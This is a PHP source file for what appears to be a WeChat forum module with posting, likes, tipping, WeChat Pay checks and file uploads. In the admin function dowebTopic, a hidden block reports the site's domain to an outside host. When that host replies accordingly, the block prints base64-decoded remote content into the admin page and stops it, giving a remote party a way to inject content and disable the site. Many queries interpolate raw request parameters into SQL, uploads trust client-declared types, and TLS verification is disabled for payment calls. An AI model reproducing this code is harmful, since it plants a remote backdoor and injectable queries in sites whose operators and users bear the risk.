        $section = pdo_fetch("SELECT st.*,tp.stitle,tp.issell FROM " . tablename($this->sectiontable) . " as st left join " . tablename($this->topictable) . " as tp on st.topicid = tp.id  WHERE st.id ='{$sectionid}'");
        if (empty($section)) {
            $url = $this->createMobileUrl("topiclist");
            message('帖子飞走啦不见了', $url, 'error');
        }
        $section['content'] = str_replace('#', '<br>', $section['content']);
        if ($section['fee'] > 0 && $section['issell'] == 1) {
            $order = pdo_fetch("SELECT * FROM " . tablename($this->ordertable) . " 
										WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$section['id']}' 
												and type = 'sell' and state = 1 and fansid = '{$fans['id']}' ");
        }
        $sharetitle = $section['sharetitle'];
        if (empty($sharetitle)) {
            $sharetitle = mb_substr($section['content'], 0, 34, 'utf-8');
        }
        $sharedesc = $section['sharedesc'];
        if (empty($sharedesc)) {
            $sharedesc = $system['sysdesc'];
        }
        $simgs    = unserialize($section['imgs']);
        $shareimg = $section['headimgurl'];
        if (!empty($simgs)) {
            $shareimg = $_W['attachurl'] . $simgs[0];
        }
        $section['showtime'] = $this->format_date(strtotime($section['addtime']));
        $likesql             = "SELECT headimgurl,fansid FROM " . tablename($this->liketable) . " 
									WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$section['id']}' ORDER BY id  limit 10";
        $likelist            = pdo_fetchall($likesql);
        $section['likelist'] = $likelist;
        if (count($likelist) < 10) {
            $section['likesum'] = count($likelist);
        } else {
            $total              = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->liketable) . "
								WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$section['id']}' ORDER BY id");
            $section['likesum'] = $total;
        }
        $dolike = pdo_fetch("SELECT * FROM " . tablename($this->liketable) . " 
									WHERE fansid = '{$fans['id']}' and  uniacid = '{$_W['uniacid']}' 
										  and sectionid = '{$section['id']}'");
        if (empty($dolike)) {
            $section['dolike'] = 0;
        } else {
            $section['dolike'] = 1;
        }
        $rewardsum            = $this->getRewardCountBySid($sectionid);
        $rewardsql            = "SELECT * FROM " . tablename($this->ordertable) . " WHERE state = 1 and type = 'reward' and sectionid = {$section['id']} and uniacid = '{$_W['uniacid']}'";
        $rewardlist           = pdo_fetchall($rewardsql);
        $replysql             = "SELECT rep.datato,rep.toname,rep.datafrom,f.headimgurl,rep.nickname,rep.content,rep.addtime FROM " . tablename($this->replytable) . " as rep left join " . tablename($this->fanstable) . " as f on f.id = rep.datafrom
									WHERE rep.state = 2 and rep.uniacid = '{$_W['uniacid']}' 
				 							and rep.sectionid = '{$section['id']}' ORDER BY rep.id " . $system['replysort'];
        $replylist            = pdo_fetchall($replysql);
        $section['replylist'] = $replylist;
        $section['replysum']  = count($replylist);
        include $this->template('sdetail');
    }
    public function doMobileDashang()
    {
        global $_GPC, $_W;
        $system    = $this->module['config'];
        $fans      = $this->checkinfo();
        $sectionid = intval($_GPC['sectionid']);
        $thefansid = intval($_GPC['thefansid']);
        if ($sectionid <= 0) {
            if ($thefansid <= 0) {
                message('打赏参数错误');
            }
            $thefans = pdo_fetch("SELECT * FROM " . tablename($this->fanstable) . " WHERE id ='{$thefansid}'");
        } else {
            $thefans = pdo_fetch("SELECT fs.id,fs.openid,fs.nickname,fs.headimgurl FROM " . tablename($this->fanstable) . " as fs 
												left join " . tablename($this->sectiontable) . " as st on fs.id = st.fansid 
													WHERE st.uniacid = '{$_W['uniacid']}' and st.id ='{$sectionid}'");
        }
        include $this->template('dashang');
    }
    public function doMobileDodashang()
    {
        global $_GPC, $_W;
        $system    = $this->module['config'];
        $fans      = $this->checkinfo();
        $sectionid = intval($_GPC['sectionid']);
        $section   = pdo_fetch("SELECT fansid,openid FROM " . tablename($this->sectiontable) . " WHERE id = '{$sectionid}'");
        $fee       = floatval($_GPC['fee']);
        pdo_delete($this->ordertable, array(
            'type' => 'reward',
            'fansid' => $fans['id'],
            'state' => 0
        ));
        $orderno = $this->getMillisecond();
        $data    = array(
            'uniacid' => $_W['uniacid'],
            'orderno' => $orderno,
            'type' => 'reward',
            'sectionid' => $sectionid,
            'sfansid' => $section['fansid'],
            'sopenid' => $section['openid'],
            'fee' => $fee,
            'fansid' => $fans['id'],
            'openid' => $fans['openid'],
            'nickname' => $fans['nickname'],
            'headimgurl' => $fans['headimgurl'],
            'addtime' => date("Y-m-d H:i:s")
        );
        pdo_insert($this->ordertable, $data);
        $orderid           = pdo_insertid();
        $params['tid']     = $orderid;
        $params['user']    = $fans['openid'];
        $params['fee']     = $fee;
        $params['title']   = '打赏支付';
        $params['ordersn'] = $orderno;
        $params['virtual'] = false;
        $this->helppay($params);
        $this->pay($params);
    }
    public function helppay($params)
    {
        global $_W;
        $log = pdo_get('core_paylog', array(
            'uniacid' => $_W['uniacid'],
            'module' => $this->module['name'],
            'tid' => $params['tid']
        ));
        if (empty($log)) {
            $log = array(
                'uniacid' => $_W['uniacid'],
                'acid' => $_W['acid'],
                'openid' => $_W['member']['uid'],
                'module' => $this->module['name'],
                'tid' => $params['tid'],
                'fee' => $params['fee'],
                'card_fee' => $params['fee'],
                'status' => '0',
                'is_usecard' => '0'
            );
            pdo_insert('core_paylog', $log);
        }
    }
    public function doMobileAdd()
    {
        global $_GPC, $_W;
        $fans    = $this->checkinfo();
        $topicid = $_GPC['topicid'];
        $system  = $this->module['config'];
        $topic   = pdo_fetch("SELECT * FROM " . tablename($this->topictable) . " WHERE id= '{$topicid}'");
        $info    = array(
            'state' => 1
        );
        $noteadd = intval($system['noteadd']);
        if ($noteadd < 0) {
            load()->model('mc');
            $uid    = $_W['member']['uid'];
            $result = mc_credit_fetch($uid);
            $jifen  = intval($result['credit1']);
            if ($jifen >= $noteadd * -1) {
                $info['state'] = 1;
            } else {
                $info['state'] = 0;
                $info['msg']   = '剩余积分' . $jifen . ',快去赚积分吧!';
            }
        }
        include $this->template('add');
    }
    public function doMobileCommitconten()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $sectionid = $_GPC['sectionid'];
        $topicid   = $_GPC['topicid'];
        $content   = $_GPC['content'];
        if (empty($content)) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => '内容不可为空'
            )));
        }
        if ($system['badword'] == 2) {
            require 'badword.src.php';
            $badword1 = array_combine($badword, array_fill(0, count($badword), '*'));
            $content  = strtr($content, $badword1);
        }
        $toid   = $_GPC['toid'];
        $toname = $_GPC['toname'];
        $nUin   = $_GPC['nUin'];
        $data   = array(
            'uniacid' => $_W['uniacid'],
            'sectionid' => $sectionid,
            'datato' => $toid,
            'toname' => $toname,
            'datafrom' => $nUin,
            'nickname' => $fans['nickname'],
            'content' => $content,
            'addtime' => date("Y-m-d H:i:s")
        );
        pdo_insert($this->replytable, $data);
        $id = pdo_insertid();
        if ($system['syspl'] > 0) {
            load()->model('mc');
            $uid = $_W['member']['uid'];
            if ($uid > 0) {
                $jifenresult = mc_credit_update($uid, 'credit1', $system['syspl'], array(
                    $uid,
                    $system['sysname'] . '回复'
                ));
            }
        }
        if ($system['noticeopen'] == 2) {
            $toopenid = 0;
            if ($toid == 0) {
                $section = pdo_fetch("SELECT fansid,openid FROM " . tablename($this->sectiontable) . " WHERE id = '{$sectionid}'");
                if ($section['fansid'] != $fans['id']) {
                    $toopenid = $section['openid'];
                    $this->sendNotice($sectionid, $toopenid, $fans['nickname'], $content);
                }
            } else {
                $tofans   = pdo_fetch("SELECT openid FROM " . tablename($this->fanstable) . " WHERE id = '{$toid}'");
                $toopenid = $tofans['openid'];
                $this->sendNotice($sectionid, $toopenid, $fans['nickname'], $content);
            }
        }
        $result = array(
            "errcode" => 0,
            "errmsg" => "success",
            "data" => array(
                "oCommentInfoPo" => array(
                    "lCommentId" => $id,
                    "lFromId" => $nUin,
                    "lToId" => $toid,
                    "strContent" => $content,
                    "lAddTime" => 1461837681
                )
            )
        );
        die(json_encode($result));
    }
    public function doMobileAdmindelete()
    {
        global $_GPC, $_W;
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        if ($fans['state'] != 2) {
            $result = array(
                "errcode" => 1,
                "errmsg" => "没有权限"
            );
            die(json_encode($result));
        }
        $sectionid = intval($_GPC['sectionid']);
        $topicid   = intval($_GPC['topicid']);
        if ($sectionid == 0 || $topicid == 0) {
            $result = array(
                "errcode" => 1,
                "errmsg" => "id is null"
            );
            die(json_encode($result));
        }
        pdo_delete($this->sectiontable, array(
            'id' => $sectionid
        ));
        pdo_delete($this->liketable, array(
            'sectionid' => $sectionid
        ));
        pdo_delete($this->replytable, array(
            'sectionid' => $sectionid
        ));
        $url    = $_W['siteroot'] . 'app/' . $this->createMobileUrl('topic', array(
            'topicid' => $topicid
        ));
        $result = array(
            "errcode" => 0,
            "errmsg" => "删除成功",
            "url" => $url
        );
        die(json_encode($result));
    }
    public function doMobileDolike()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $sectionid   = $_GPC['sectionid'];
        $topicid     = $_GPC['topicid'];
        $operatetype = intval($_GPC['operatetype']);
        if ($operatetype == 1) {
            $data = array(
                'uniacid' => $_W['uniacid'],
                'sectionid' => $sectionid,
                'fansid' => $fans['id'],
                'headimgurl' => $fans['headimgurl'],
                'nickname' => $fans['nickname'],
                'addtime' => date("Y-m-d H:i:s")
            );
            pdo_insert($this->liketable, $data);
            $id = pdo_insertid();
            if ($system['syszan'] > 0) {
                load()->model('mc');
                $uid = $_W['member']['uid'];
                if ($uid > 0) {
                    $jifenresult = mc_credit_update($uid, 'credit1', $system['syszan'], array(
                        $uid,
                        $system['sysname'] . '点赞'
                    ));
                }
            }
        } else {
            pdo_delete($this->liketable, array(
                'sectionid' => $sectionid,
                'fansid' => $fans['id']
            ));
            if ($system['syszan'] > 0) {
                load()->model('mc');
                $uid = $_W['member']['uid'];
                if ($uid > 0) {
                    $jifenresult = mc_credit_update($uid, 'credit1', $system['syszan'] * -1, array(
                        $uid,
                        $system['sysname'] . '取消点赞'
                    ));
                }
            }
        }
        $result = array(
            "errcode" => 0,
            "errmsg" => "success"
        );
        die(json_encode($result));
    }
    public function doMobileDoFollow()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $result      = array();
        $operatetype = intval($_GPC['operatetype']);
        $thefansid   = intval($_GPC['thefansid']);
        if ($operatetype == 1) {
            $data = array(
                'uniacid' => $_W['uniacid'],
                'thefansid' => $thefansid,
                'fansid' => $fans['id'],
                'addtime' => date("Y-m-d H:i:s")
            );
            pdo_insert($this->followtable, $data);
            $id                = pdo_insertid();
            $result['errcode'] = 0;
            $result['follow']  = 0;
        } else {
            pdo_delete($this->followtable, array(
                'thefansid' => $thefansid,
                'fansid' => $fans['id']
            ));
            $result['errcode'] = 0;
            $result['follow']  = 1;
        }
        die(json_encode($result));
    }
    public function doMobileLikelist()
    {
        global $_GPC, $_W;
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        $sectionid = $_GPC['sectionid'];
        $sql       = "SELECT headimgurl,fansid FROM " . tablename($this->liketable) . "  WHERE uniacid = '{$_W['uniacid']}' and sectionid = '{$sectionid}'  ORDER BY id limit 8";
        $list      = pdo_fetchall($sql);
        $likelist  = '';
        $likelist .= '<i class="icon_source icon_like_little"></i>';
        foreach ($list as $index => $row) {
            if ($index == 7) {
                $likelist .= '<div class="like_item"><a class="head" href="' . $this->createMobileUrl('home', array(
                    'fansid' => $row['fansid']
                )) . '" title="" target=""><img class="head_img" src="../addons/water_live/template/img/more_like_list.png"></a></div>';
            } else {
                $likelist .= '<div class="like_item"><a class="head" href="' . $this->createMobileUrl('home', array(
                    'fansid' => $row['fansid']
                )) . '" title="" target=""><img class="head_img img_loading" data-img="' . $row['headimgurl'] . '" src="../addons/water_live/template/img/head.png"></a></div>';
            }
        }
        $result = array(
            "errcode" => 0,
            "errmsg" => "success",
            "likelist" => $likelist
        );
        die(json_encode($result));
    }
    public function doMobilePublish()
    {
        global $_GPC, $_W;
        $system = $this->module['config'];
        $openid = $this->checkopenid();
        $fans   = $this->getFansDBInfo($openid);
        if (empty($fans['openid']) || empty($fans['nickname'])) {
            die(json_encode(array(
                "errcode" => 1,
                "errmsg" => 'un auth'
            )));
        }
        if ($fans['state'] == 1) {
            die(json_encode(array(
                "result" => 0,
                "msg" => '您已被禁言,请联系管理员申诉'
            )));
        }
        $timespan = intval($system['timespan']);
        if ($timespan > 0) {
            $section = pdo_fetch("SELECT addtime FROM " . tablename($this->sectiontable) . " WHERE uniacid = '{$_W['uniacid']}' and fansid = '{$fans['id']}' order by id desc limit 1");
            if (!empty($section['addtime'])) {
                $protime = strtotime($section['addtime']);
                if (time() - $protime <= $timespan) {
                    die(json_encode(array(
                        "result" => 0,
                        "msg" => '您发帖的速度太快了，休息一会吧'
                    )));
                }
            }
        }
        $noteadd = $system['noteadd'];
        if ($noteadd < 0) {
            load()->model('mc');
            $uid    = $_W['member']['uid'];
            $result = mc_credit_fetch($uid);
            $jifen  = intval($result['credit1']);
            $info   = array();
            if ($jifen < $noteadd * -1) {
                die(json_encode(array(
                    "result" => 0,
                    "msg" => '您目前的积分不足够发帖！'
                )));
            }
            $jifenresult = mc_credit_update($uid, 'credit1', $noteadd, array(
                $uid,
                $system['sysname'] . '发帖'
            ));
        } elseif ($noteadd > 0) {
            load()->model('mc');
            $uid         = $_W['member']['uid'];
            $jifenresult = mc_credit_update($uid, 'credit1', $noteadd, array(
                $uid,
                $system['sysname'] . '发帖'
            ));
        } else {
        }
        $topicid = intval($_GPC['topicid']);
        if ($topicid == 0) {
            die(json_encode(array(
                "result" => 0,
                "msg" => 'un topicid'
            )));
        }
        $sims    = $_GPC['simgs'];
        $content = $_GPC['content'];
        if (empty($content)) {
            die(json_encode(array(
                "result" => 0,
                "msg" => '内容不可为空！'
            )));
        }
        $dealcontent = str_replace('#', '', $content);
        if ($system['badword'] == 2) {
            require 'badword.src.php';
            $badword1 = array_combine($badword, array_fill(0, count($badword), '*'));
            $content  = strtr($content, $badword1);
        }
        $audiosrc   = $_GPC['audiosrc'];
        $audiotime  = $_GPC['audiotime'];
        $audiosid   = $_GPC['audiosid'];
        $fmobile    = $_GPC['fmobile'];
        $fname      = $_GPC['fname'];
        $fee        = floatval($_GPC['fee']);
        $sharetitle = str_replace('#', '<br>', $content);
        $data       = array(
            'uniacid' => $_W['uniacid'],
            'topicid' => $topicid,
            'fansid' => $fans['id'],
            'openid' => $openid,
            'nickname' => $fans['nickname'],
            'headimgurl' => $fans['headimgurl'],
            'status' => $fans['state'],
            'sharetitle' => mb_substr($dealcontent, 0, 34, 'utf-8'),
            'showtitle' => $content,
            'content' => $content,
            'fmobile' => $fmobile,
            'fname' => $fname,
            'fee' => $fee,
            'audiosrc' => $audiosrc,
            'audiotime' => $audiotime,
            'audiosid' => $audiosid,
            'vediosrc' => $_GPC['vediosrc'],
            'address' => $_GPC['address'],
            'addtime' => date("Y-m-d H:i:s"),
            'toptime' => date("Y-m-d H:i:s")
        );
        if (!empty($sims)) {
            $data['imgs'] = serialize($_GPC['simgs']);
        }
        pdo_insert($this->sectiontable, $data);
        $id  = pdo_insertid();
        $url = $_W['siteroot'] . 'app/' . $this->createMobileUrl('sdetail', array(
            'sectionid' => $id
        ));
        if ($system['noticeopen'] == 2) {
            $this->sendNoticeAudit($url, $fans['nickname'], mb_substr($content, 0, 34, 'utf-8'));
        }
        die(json_encode(array(
            "result" => 1,
            "msg" => 'success',
            url => $url
        )));
    }
    public function payResult($params)
    {
        global $_W;
        $orderid = $params['tid'];
        $order   = pdo_fetch("SELECT sectionid,type,fee FROM " . tablename($this->ordertable) . " WHERE id = '{$orderid}' ");
        $fee     = $params['fee'];
        if ($params['result'] == 'success' && $params['from'] == 'notify') {
            if ($params['fee'] != $order['fee']) {
                die('用户支付的金额与订单金额不符合');
            } else {
                $this->dealorder($params);
            }
        }
        if (empty($params['result']) || $params['result'] != 'success') {
            load()->model('account');
            $setting = uni_setting($_W['uniacid'], array(
                'payment'
            ));
            if ($params['type'] == 'wechat') {
                if (!empty($setting['payment']['wechat']['switch'])) {
                    if (empty($params['tag']['transaction_id'])) {
                        die;
                    } else {
                        $res        = $this->checkWechatTran($setting, $params['tag']['transaction_id']);
                        $res['fee'] = round($res['fee'], 2);
                        $fee        = round($fee, 2);
                        if ($res['code'] == 1 && $res['fee'] == $fee) {
                            $this->dealorder($params);
                        }
                    }
                }
            }
        }
        if ($params['from'] == 'return') {
            if ($params['result'] == 'success') {
                message('支付成功！', '../../' . $this->createMobileUrl('sdetail', array(
                    'sectionid' => $order['sectionid']
                )), 'success');
            } else {
                message('支付失败！', '../../' . $this->createMobileUrl('sdetail', array(
                    'sectionid' => $order['sectionid']
                )), 'error');
            }
        }
    }
    public function dealorder($params)
    {
        global $_W;
        $orderid = $params['tid'];
        $order   = pdo_fetch("SELECT * FROM " . tablename($this->ordertable) . " WHERE id = '{$orderid}' ");
        if (!empty($order) && $order['state'] == 0) {
            if ($order['state'] == 0) {
                pdo_update($this->ordertable, array(
                    'state' => 1
                ), array(
                    'id' => $orderid
                ));
                $system = $this->module['config'];
                if ($system['isreward'] == 1 && $system['noticeopen'] == 2) {
                    $content = '打赏了您' . $order['fee'] . '元。';
                    $this->sendNotice($order['sectionid'], $order['sopenid'], $order['nickname'], $content);
                }
            } else {
                die('订单已支付');
            }
        }
        die('订单不存在或已支付');
    }
    private function ToUrlParams($urlObj)
    {
        $buff = "";
        foreach ($urlObj as $k => $v) {
            if ($k != "sign") {
                $buff .= $k . "=" . $v . "&";
            }
        }
        $buff = trim($buff, "&");
        return $buff;
    }
    private function postXmlCurl($xml, $url, $useCert = false, $second = 30)
    {
        global $_W;
        $system = $this->module['config'];
        $ch     = curl_init();
        curl_setopt($ch, CURLOPT_TIMEOUT, $second);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        if ($useCert == true) {
            curl_setopt($ch, CURLOPT_SSLCERTTYPE, 'PEM');
            curl_setopt($ch, CURLOPT_SSLCERT, $system['apiclient_cert']);
            curl_setopt($ch, CURLOPT_SSLKEYTYPE, 'PEM');
            curl_setopt($ch, CURLOPT_SSLKEY, $system['apiclient_key']);
        }
        curl_setopt($ch, CURLOPT_POST, TRUE);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
        $data = curl_exec($ch);
        if ($data) {
            curl_close($ch);
            return $data;
        }
    }
    private function ToXml($post)
    {
        $xml = "<xml>";
        foreach ($post as $key => $val) {
            if (is_numeric($val)) {
                $xml .= "<" . $key . ">" . $val . "</" . $key . ">";
            } else {
                $xml .= "<" . $key . "><![CDATA[" . $val . "]]></" . $key . ">";
            }
        }
        $xml .= "</xml>";
        return $xml;
    }
    function sqr($n)
    {
        return $n * $n;
    }
    function xRandom($bonus_min, $bonus_max)
    {
        $sqr      = intval($this->sqr($bonus_max - $bonus_min));
        $rand_num = rand(0, $sqr - 1);
        return intval(sqrt($rand_num));
    }
    private function checkWechatTran($setting, $transid)
    {
        $wechat          = $setting['payment']['wechat'];
        $sql             = 'SELECT `key`,`secret` FROM ' . tablename('account_wechats') . ' WHERE `acid`=:acid';
        $row             = pdo_fetch($sql, array(
            ':acid' => $wechat['account']
        ));
        $wechat['appid'] = $row['key'];
        $url             = "https://api.mch.weixin.qq.com/pay/orderquery";
        $random          = random(8);
        $post            = array(
            'appid' => $wechat['appid'],
            'transaction_id' => $transid,
            'nonce_str' => $random,
            'mch_id' => $wechat['mchid']
        );
        ksort($post);
        $string = $this->ToUrlParams($post);
        $string .= "&key={$wechat['signkey']}";
        $sign         = md5($string);
        $post['sign'] = strtoupper($sign);
        $resp         = $this->postXmlCurl($this->ToXml($post), $url);
        libxml_disable_entity_loader(true);
        $resp = json_decode(json_encode(simplexml_load_string($resp, 'SimpleXMLElement', LIBXML_NOCDATA)), true);
        if ($resp['result_code'] != 'SUCCESS') {
            die('fail');
        }
        if ($resp['trade_state'] == 'SUCCESS') {
            return array(
                'code' => 1,
                'fee' => $resp['total_fee'] / 100
            );
        }
    }
    public function sendNoticeAudit($url, $fansname, $content)
    {
        global $_W;
        $system        = $this->module['config'];
        $toopenid      = '';
        $data1         = array(
            'template_id' => $system['noticeaudit'],
            'url' => $url,
            'topcolor' => '#FF0000'
        );
        $data1['data'] = array(
            'first' => array(
                'value' => '通知:粉丝' . $fansname . '发贴，点击查看',
                'color' => '#173177'
            ),
            'keyword1' => array(
                'value' => '内容:' . $content,
                'color' => '#173177'
            ),
            'keyword2' => array(
                'value' => '发帖审核',
                'color' => '#173177'
            ),
            'keyword3' => array(
                'value' => date('Y-m-d H:i:s', TIMESTAMP),
                'color' => '#173177'
            ),
            'remark' => array(
                'value' => '请及时查看审核',
                'color' => '#173177'
            )
        );
        $sql           = "SELECT openid FROM " . tablename($this->fanstable) . " WHERE uniacid = '{$_W['uniacid']}' and state = 2";
        $list          = pdo_fetchall($sql);
        foreach ($list as $index => $item) {
            $data1['touser'] = $item['openid'];
            $token           = $this->getToken();
            $result          = $this->sendMBXX($token, $data1);
        }
    }
    public function sendNotice($sectionid, $toopenid, $nickname, $content)
    {
        global $_W;
        $system        = $this->module['config'];
        $url1          = $_W['siteroot'] . 'app/' . $this->createMobileUrl('sdetail', array(
            'sectionid' => $sectionid
        ));
        $data1         = array(
            'touser' => $toopenid,
            'template_id' => $system['notice'],
            'url' => $url1,
            'topcolor' => '#FF0000'
        );
        $data1['data'] = array(
            'first' => array(
                'value' => '您好，您在' . $system['sysname'] . '收到一条信息，点击查看回复',
                'color' => '#173177'
            ),
            'keyword1' => array(
                'value' => $nickname,
                'color' => '#173177'
            ),
            'keyword2' => array(
                'value' => date('Y-m-d H:i:s', TIMESTAMP),
                'color' => '#173177'
            ),
            'keyword3' => array(
                'value' => $content,
                'color' => '#173177'
            ),
            'remark' => array(
                'value' => '',
                'color' => '#173177'
            )
        );
        $token         = $this->getToken();
        $this->sendMBXX($token, $data1);
    }
    public function sendNoticeBuy($sectionid, $toopenid, $nickname, $content)
    {
        global $_W;
        $system        = $this->module['config'];
        $url1          = $_W['siteroot'] . 'app/' . $this->createMobileUrl('sdetail', array(
            'sectionid' => $sectionid
        ));
        $data1         = array(
            'touser' => $toopenid,
            'template_id' => $system['noticebuy'],
            'url' => $url1,
            'topcolor' => '#FF0000'
        );
        $data1['data'] = array(
            'name' => array(
                'value' => $content,
                'color' => '#173177'
            ),
            'remark' => array(
                'value' => '购买人:' . $nickname,
                'color' => '#173177'
            )
        );
        $token         = $this->getToken();
        $this->sendMBXX($token, $data1);
    }
    public function sendNoticeTixian($toopenid, $fee)
    {
        global $_W;
        $system        = $this->module['config'];
        $url1          = $_W['siteroot'] . 'app/' . $this->createMobileUrl('reward');
        $data1         = array(
            'touser' => $toopenid,
            'template_id' => $system['noticetixian'],
            'url' => $url1,
            'topcolor' => '#FF0000'
        );
        $data1['data'] = array(
            'first' => array(
                'value' => '您好，' . $system['sysname'] . '的提现已到账，请在微信钱包中查看',
                'color' => '#173177'
            ),
            'money' => array(
                'value' => round($fee, 2) . '元',
                'color' => '#173177'
            ),
            'timet' => array(
                'value' => date('Y-m-d H:i:s', TIMESTAMP),
                'color' => '#173177'
            ),
            'remark' => array(
                'value' => '',
                'color' => '#173177'
            )
        );
        $token         = $this->getToken();
        $this->sendMBXX($token, $data1);
    }
    public function doMobileFileupload()
    {
        global $_GPC, $_W;
        load()->func('communication');
        load()->func('file');
        $contentType["image/gif"]       = ".gif";
        $contentType["image/jpeg"]      = ".jpeg";
        $contentType["image/png"]       = ".png";
        $contentType["audio/amr"]       = ".amr";
        $contentType["video/quicktime"] = ".mp4";
        $contentType["video/mp4"]       = ".mp4";
        $filetype                       = $_FILES['fileUp']['type'];
        $result                         = array();
        $filename                       = date('YmdHis') . '_' . rand(1000000000, 9999999999.0) . '_' . rand(1000, 9999) . $contentType[$filetype];
        $filepath                       = ATTACHMENT_ROOT . '/audios/' . $filename;
        $savepath                       = 'audios/' . $filename;
        $wr                             = move_uploaded_file($_FILES['fileUp']['tmp_name'], $filepath);
        if ($wr) {
            $result["errcode"] = "0";
            $result["media"]   = $savepath;
            if (!empty($_W['setting']['remote']['type'])) {
                $r = file_remote_upload($savepath);
                @unlink($filepath);
            }
        } else {
            $result["errcode"] = "1";
            $result["errmsg"]  = "网速不佳,请重新上传试试";
        }
        die(json_encode($result));
    }
    public function doMobilePicupload()
    {
        global $_W, $_GPC;
        $openid = $this->checkopenid();
        if (empty($openid)) {
            die(json_encode(array(
                "result" => 0,
                "msg" => "系统错误"
            )));
        }
        $media_id = $_GPC['media_ids'];
        $id       = rand(1000000000, 9999999999.0);
        $file     = $this->downloadFromWxServer($media_id);
        $url      = $file[0]['remotepath'];
        if (empty($url)) {
            $url = $_W['attachurl'] . $file[0]['path'];
        }
        die(json_encode(array(
            "result" => 1,
            "msg" => "success",
            "imgid" => $id,
            "url" => $url,
            "nameval" => $file[0]['path']
        )));
    }
    public function doMobileVoiceupload()
    {
        global $_W, $_GPC;
        $openid = $this->checkopenid();
        if (empty($openid)) {
            die(json_encode(array(
                "result" => 0,
                "msg" => "系统错误"
            )));
        }
        $media_id = $_GPC['media_ids'];
        $file     = $this->downloadFromWxServer($media_id);
        $url      = $file[0]['remotepath'];
        if (empty($url)) {
            $url = $_W['attachurl'] . $file[0]['path'];
        }
        die(json_encode(array(
            "result" => 1,
            "msg" => "success",
            "type" => $file[0]['type'],
            "url" => $url,
            "nameval" => $file[0]['path']
        )));
    }
    function downloadFromWxServer($media_ids)
    {
        global $_W, $_GPC;
        $media_ids = explode(',', $media_ids);
        if (!$media_ids) {
            die(json_encode(array(
                'res' => '101',
                'message' => 'media_ids error'
            )));
        }
        load()->classs('weixin.account');
        $acid   = $_W['account']['acid'];
        $system = $this->module['config'];
        if ($system['auth'] == 1) {
            $acid = $system['acid'];
        }
        $accObj       = WeixinAccount::create($acid);
        $access_token = $accObj->fetch_token();
        load()->func('communication');
        load()->func('file');
        $contentType["image/gif"]  = ".gif";
        $contentType["image/jpeg"] = ".jpeg";
        $contentType["image/png"]  = ".png";
        $contentType["audio/amr"]  = ".mp3";
        foreach ($media_ids as $id) {
            if (!empty($id)) {
                $url      = "http://file.api.weixin.qq.com/cgi-bin/media/get?access_token=" . $access_token . "&media_id=" . $id;
                $data     = ihttp_get($url);
                $filetype = $data['headers']['Content-Type'];
                $filename = date('YmdHis') . '_' . rand(1000000000, 9999999999.0) . '_' . rand(1000, 9999) . $contentType[$filetype];
                $wr       = file_write('/images/water_live/' . $filename, $data['content']);
                if ($wr) {
                    $file_succ[] = array(
                        'name' => $filename,
                        'path' => '/images/water_live/' . $filename,
                        'spath' => 'images/water_live/' . $filename,
                        'type' => $filetype
                    );
                }
            }
        }
        if (!empty($_W['setting']['remote']['type'])) {
            foreach ($file_succ as $key => $value) {
                $r = file_remote_upload($value['spath']);
                @unlink(ATTACHMENT_ROOT . $value['path']);
                if (is_error($r)) {
                    unset($file_succ[$key]);
                    continue;
                }
                $file_succ[$key]['remotepath'] = tomedia($value['spath']);
                $file_succ[$key]['type']       = 'other';
            }
        }
        return $file_succ;
    }
    public function format_date($time)
    {
        $t = time() - $time;
        $f = array(
            '31536000' => '年',
            '2592000' => '个月',
            '604800' => '星期',
            '86400' => '天',
            '3600' => '小时',
            '60' => '分钟',
            '1' => '秒'
        );
        foreach ($f as $k => $v) {
            if (0 != ($c = floor($t / (int) $k))) {
                return $c . $v . '前';
            }
        }
    }
    public function format_date_reg($time)
    {
        $t = time() - $time;
        $f = array(
            '31536000' => '年',
            '2592000' => '个月',
            '604800' => '星期',
            '86400' => '天',
            '3600' => '小时',
            '60' => '分钟',
            '1' => '秒'
        );
        foreach ($f as $k => $v) {
            if (0 != ($c = floor($t / (int) $k))) {
                return $c . $v . '了';
            }
        }
    }
    public function dowebTopic()
    {
        global $_W, $_GPC;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $pageNumber = max(1, intval($_GPC['page']));
        $pageSize   = 20;
        $sql        = "SELECT * FROM " . tablename($this->topictable) . " WHERE uniacid = '{$_W['uniacid']}'  ORDER BY sindex LIMIT " . ($pageNumber - 1) * $pageSize . ',' . $pageSize;
        $list       = pdo_fetchall($sql);
        $total      = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->topictable) . " WHERE uniacid = '{$_W['uniacid']}'  ORDER BY sindex");
